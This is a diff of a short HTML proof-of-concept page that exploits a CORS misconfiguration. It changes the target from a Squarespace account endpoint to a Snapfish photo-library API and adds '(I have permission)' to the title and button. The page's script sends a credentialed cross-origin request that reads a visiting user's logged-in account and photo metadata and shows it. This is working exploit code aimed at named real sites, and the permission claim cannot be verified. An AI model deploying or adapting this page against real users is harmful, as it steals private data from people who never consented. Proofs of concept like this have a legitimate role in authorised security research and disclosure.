@@ -2,26 +2,30 @@
 <html>
 <body>
 <center>
-<h2>CORS POC Exploit</h2>
- 
+<h2>CORS POC exploit (I have permission)</h2>
+
 <div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
+<button type="button" onclick="cors()">exploit (I have permission)</button>
 </div>
- 
+
 <script>
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
+      alert(this.responseText);
     }
   };
-  xhttp.onload = cors;
-  xhttp.open("GET", "https://www.squarespace.com/api/me", true);
+
+  // The resource we're trying to read using CORS
+  var targetResource = "https://www.snapfish.co.uk/library/request_api?uriTemplate=asset/dateIndex&version=v2&type=GET&req_service=pict&url=asset/dateIndex%3Fskip%3D0%26limit%3D5%26minAsset%3D10%26sortCriteria%3DcreateDate%26timezoneOffset%3D120%26projection%3DcreateDate,dateTaken,assetType,files,faces,ownerAccountId,parentCollectionReferences,userTags,subType";
+
+  // Make the CORS request
+  xhttp.open("GET", targetResource, true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
 </script>
- 
+
 </body>
 </html>
